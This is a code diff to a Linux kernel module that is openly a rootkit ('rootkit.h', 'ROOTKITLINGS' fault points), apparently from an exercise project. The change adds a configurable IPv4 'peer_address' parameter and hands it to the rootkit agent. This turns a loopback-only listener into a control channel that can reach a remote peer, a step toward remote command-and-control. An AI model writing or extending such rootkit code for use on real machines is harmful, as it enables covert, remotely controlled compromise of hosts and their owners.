@@ -6,6 +6,7 @@
 
 #include "agent.h"
 #include "agent_status.h"
+#include "ipv4.h"
 #include "platform.h"
 #include "rootkit.h"
 #include "transaction.h"
@@ -16,7 +17,12 @@
 
 static unsigned short peer_port;
 module_param(peer_port, ushort, 0400);
-MODULE_PARM_DESC(peer_port, "loopback TCP listener port");
+MODULE_PARM_DESC(peer_port, "control TCP listener port");
+
+static char peer_address_text[16] = "127.0.0.1";
+module_param_string(peer_address, peer_address_text,
+		    sizeof(peer_address_text), 0400);
+MODULE_PARM_DESC(peer_address, "control IPv4 peer address");
 
 static unsigned int retry_base_ms = 25;
 module_param(retry_base_ms, uint, 0400);
@@ -32,9 +38,12 @@ static struct rk_transaction transaction;
 
 static int __init rk_init(void)
 {
+	__be32 peer_address;
 	int error;
 
-	if (!peer_port || !retry_base_ms || retry_base_ms > retry_max_ms ||
+	error = rk_ipv4_parse(peer_address_text, &peer_address);
+	if (error || !peer_port || !retry_base_ms ||
+	    retry_base_ms > retry_max_ms ||
 	    retry_max_ms > 5000)
 		return -EINVAL;
 	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
@@ -69,7 +78,8 @@ static int __init rk_init(void)
 	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
 		error = -EINTR;
 	else
-		error = rk_agent_start(&agent, peer_port, retry_base_ms,
+		error = rk_agent_start(&agent, peer_address, peer_port,
+				       retry_base_ms,
 				       retry_max_ms);
 	if (error)
 		goto restore_transaction;
